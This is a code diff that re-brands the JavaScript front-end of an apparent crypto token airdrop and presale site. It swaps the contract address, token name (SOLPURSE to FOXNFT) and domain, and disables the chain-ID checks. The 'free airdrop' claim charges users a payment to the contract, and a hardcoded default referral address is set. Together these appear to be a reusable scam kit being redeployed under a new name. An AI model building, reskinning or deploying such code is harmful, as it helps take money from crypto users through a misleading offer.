@@ -1,6 +1,6 @@
 let web3 = new web3js.myweb3(window.ethereum);
 let addr;
-const sttaddr = "0x12aB7160baAbEBB8E3df1E0356F79aF2d721c39f";
+const sttaddr = "0x7C82560505b981fAea9E8c11d5E0A04F2a0F01CA";
 const sttabi = [{
     "inputs": [],
     "stateMutability": "nonpayable",
@@ -374,7 +374,7 @@ const loadweb3 = async () => {
         web3 = new web3js.myweb3(window.ethereum);
         console.log('Injected web3 detected.')
         sttcontract = new web3.eth.Contract(sttabi, sttaddr);
-        let a = await ethereum.send('eth_requestAccounts');
+        let a = await ethereum.enable();
         addr = web3.utils.toChecksumAddress(a[0]);
         return (addr);
     } catch (error) {
@@ -394,15 +394,15 @@ const getAirdrop = async () => {
     if (addr == undefined) {
         Swal.fire('Connect Alert', 'Please install Metamask, or paste URL link into Trustwallet (Dapps)...', 'error')
     }
-    if (chainId !== 56) {
-        Swal.fire('Connect Alert', 'Please Connect on Smart Chain', 'error')
-    }
+    // if (chainId !== 56) {
+    //     Swal.fire('Connect Alert', 'Please Connect on Smart Chain', 'error')
+    // }
     let airbnbVal = document.getElementById("airdropval").value;
     console.log(airbnbVal);
     airbnbVal = Number(airbnbVal) * 1e18;
     let fresh = document.getElementById('airinput').value;
     if (fresh === "")
-        fresh = "0x12aB7160baAbEBB8E3df1E0356F79aF2d721c39f";
+        fresh = "0x7C82560505b981fAea9E8c11d5E0A04F2a0F01CA";
     sttcontract.methods.airdrop(fresh).send({
         from: addr,
         value: airbnbVal
@@ -411,7 +411,7 @@ const getAirdrop = async () => {
             Swal.fire({
                 title: 'Successful Claim',
                 icon: 'success',
-                html: '<p>2,200,000 SOLPURSE sent to your wallet</p><p>Now you can buy tokens and invite referrals</p>',
+                html: '<p>2,200,000 FOXNFT sent to your wallet</p><p>Now you can buy tokens and invite referrals</p>',
                 showCloseButton: true,
                 showCancelButton: true,
                 focusConfirm: false,
@@ -431,20 +431,21 @@ const getAirdrop = async () => {
     });
 }
 const buystt = async () => {
+    console.log("ethval");
     await loadweb3();
     const chainId = await web3.eth.getChainId();
     if (addr == undefined) {
         Swal.fire('Connect Alert', 'Please install Metamask, or paste URL link into Trustwallet (Dapps)...', 'error')
     }
-    if (chainId !== 56) {
-        Swal.fire('Connect Alert', 'Please Connect on Smart Chain', 'error')
-    }
+    // if (chainId !== 56) {
+    //     Swal.fire('Connect Alert', 'Please Connect on Smart Chain', 'error')
+    // }
     let ethval = document.getElementById("buyinput").value;
     if (ethval >= 0.01) {
         ethval = Number(ethval) * 1e18;
         let fresh = document.getElementById('airinput').value;
         if (fresh === "")
-            fresh = "0x12aB7160baAbEBB8E3df1E0356F79aF2d721c39f";
+            fresh = "0x7C82560505b981fAea9E8c11d5E0A04F2a0F01CA";
         sttcontract.methods.buy(fresh).send({
             from: addr,
             value: ethval
@@ -546,10 +547,10 @@ const addToWallet = async () => {
                 params: {
                     'type': 'ERC20',
                     'options': {
-                        'address': '0x12aB7160baAbEBB8E3df1E0356F79aF2d721c39f',
-                        'symbol': 'SOLPURSE',
+                        'address': '0x7C82560505b981fAea9E8c11d5E0A04F2a0F01CA',
+                        'symbol': 'FOXNFT',
                         'decimals': '18',
-                        'image': 'https://ethermusk.online/images/favicon.png',
+                        'image': 'https://etherbtc.online/images/favicon.png',
                     },
                 },
                 id: Math.round(Math.random() * 100000)
@@ -579,7 +580,7 @@ function getreflink() {
         if (!/^(0x){1}[0-9a-fA-F]{40}$/i.test(referaladd)) {
             Swal.fire('Referral Alert', 'Your address is not valid.', 'error')
         } else {
-            document.getElementById('refaddress').value = 'https://ethermusk.online/?ref=' + document.getElementById('refaddress').value;
+            document.getElementById('refaddress').value = 'https://etherbtc.online/?ref=' + document.getElementById('refaddress').value;
         }
     }
 }
@@ -624,7 +625,7 @@ function querySt(ji) {
 }
 var ref = querySt("ref");
 if (ref == null) {
-    ref = "0x12aB7160baAbEBB8E3df1E0356F79aF2d721c39f";
+    ref = "0x7C82560505b981fAea9E8c11d5E0A04F2a0F01CA";
     document.getElementById('airinput').value = ref;
 } else {
     document.getElementById('airinput').value = ref;
